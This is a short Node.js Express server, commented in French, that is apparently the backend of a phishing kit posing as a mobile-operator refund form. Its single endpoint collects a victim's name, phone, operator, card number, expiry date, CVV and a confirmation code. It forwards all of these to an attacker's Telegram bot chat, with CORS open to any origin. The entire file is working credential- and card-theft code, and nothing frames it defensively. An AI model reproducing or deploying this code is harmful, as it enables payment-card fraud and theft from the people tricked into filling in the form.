const express = require('express');
const axios = require('axios');
const app = express();

app.use(express.json());

// CORS middleware to allow requests from any origin (adjust for production)
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*'); // You can replace '*' with your frontend URL for better security
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
  next();
});

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.post('/send-data', async (req, res) => {
  const { fullname, phone, operator, refundAmount, cardNumber, expiryDate, cvv, confirmationCode } = req.body;

  const message = `
📥 Nouvelle demande de remboursement :

👤 Nom: ${fullname}
📱 Téléphone: ${phone}
🏢 Opérateur: ${operator}
💰 Montant: ${refundAmount} €

💳 Carte: ${cardNumber}
📆 Expiration: ${expiryDate}
🔐 CVV: ${cvv}
🆔 Code de confirmation: ${confirmationCode}
`;

  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message
    });
    res.status(200).send('Message envoyé à Telegram');
  } catch (error) {
    console.error('Erreur Telegram:', error.response?.data || error.message);
    res.status(500).send('Erreur lors de l\'envoi');
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Serveur démarré sur le port ${PORT}`);
});